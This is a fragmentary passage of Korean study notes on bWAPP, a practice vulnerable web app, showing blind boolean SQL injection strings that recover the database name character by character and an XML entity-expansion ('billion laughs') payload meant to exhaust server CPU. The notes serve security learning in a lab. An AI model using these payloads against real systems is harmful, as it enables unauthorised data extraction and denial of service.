...
## [A1] SQL Injection - Blind - Boolean-Based>
  ...
  1. 아래 형태로 입력하다가 (뒤 숫자가 틀리면 DB에 없다고 나옴) 숫자가 5가 되면 true가 되어 DB에 있다고 나온다. (즉, DB 이름이 **5**글자임)
     ```sql
     iron man' or '1'='1' and length(database())=5#`
     ```
  1. 아래와 같이 시도하면 true가 되어 DB에 있다고 나오고 DB 이름을 얻을 수 있다. (즉, **bwapp** 임)
     ```sql
     iron man' or '1'='1' and substring(database(),1,1)='b'#
     iron man' or '1'='1' and substring(database(),2,1)='w'#
     iron man' or '1'='1' and substring(database(),3,1)='a'#
     iron man' or '1'='1' and substring(database(),4,1)='p'#
     iron man' or '1'='1' and substring(database(),5,1)='p'#
     ```
...
## [A7] XML External Entity Attacks (XXE)
  ...
  1. XML bomb도 이 XXE 공격 기법으로 DoS 공격을 한다. 예를 들어 아래와 같이 보내면, "lol" 문자열이 10^3 번 출력된다.
     ```xml
     <?xml version="1.0"?>
     <!DOCTYPE Header [
     <!ENTITY lol "lol">
     ...
     <reset><login>&bee;</login><secret>Any bugs?</secret></reset>
     ```
     이제 아래와 같이 보내면 (10^9 번 "lol" 출력) 서버가 CPU 점유율이 치솟고 response는 결국 타임 아웃이 걸린다.
     ```xml
     <?xml version="1.0"?>
     <!DOCTYPE Header [
     <!ENTITY lol "lol">
